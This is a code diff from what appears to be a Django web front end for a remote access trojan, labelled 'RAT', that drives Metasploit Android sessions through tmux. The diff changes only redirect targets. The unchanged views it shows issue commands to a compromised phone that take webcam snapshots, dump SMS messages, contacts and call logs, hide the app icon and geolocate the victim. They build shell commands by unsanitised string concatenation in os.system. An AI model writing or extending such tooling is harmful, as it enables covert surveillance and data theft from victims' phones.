@@ -83,7 +83,7 @@ def webcamsnap(request):
     os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')
     os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:msf/android/listen')
 
 def dumpsms(request):
     username = request.user.username
@@ -91,7 +91,7 @@ def dumpsms(request):
 
     os.system('tmux send-keys -t '+str(username)+' "dump_sms -o '+str(dir)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:msf/android/listen')
 
 def dumpcontacts(request):
     username = request.user.username
@@ -99,7 +99,7 @@ def dumpcontacts(request):
 
     os.system('tmux send-keys -t '+str(username)+' "dump_contacts -o '+str(dir)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:msf/android/listen')
 
 def dumpcalllog(request):
     username = request.user.username
@@ -107,7 +107,7 @@ def dumpcalllog(request):
 
     os.system('tmux send-keys -t '+str(username)+' "dump_calllog -o '+str(dir)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:msf/android/listen')
 
 def hideappicon(request):
     username = request.user.username
@@ -115,7 +115,7 @@ def hideappicon(request):
 
     os.system('tmux send-keys -t '+str(username)+' "hide_app_icon""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:msf/android/listen')
 
 def geolocate(request):
     username = request.user.username
@@ -125,4 +125,4 @@ def geolocate(request):
     # gmap1 = gmplot.GoogleMapPlotter(l1,
     #                             l2, 13 )
     # gmap1.draw( str(dir)+"map.html" )
-    return JsonResponse({'latitude':l1,'longitude': l2,})
+    return redirect('RAT:msf/android/listen')
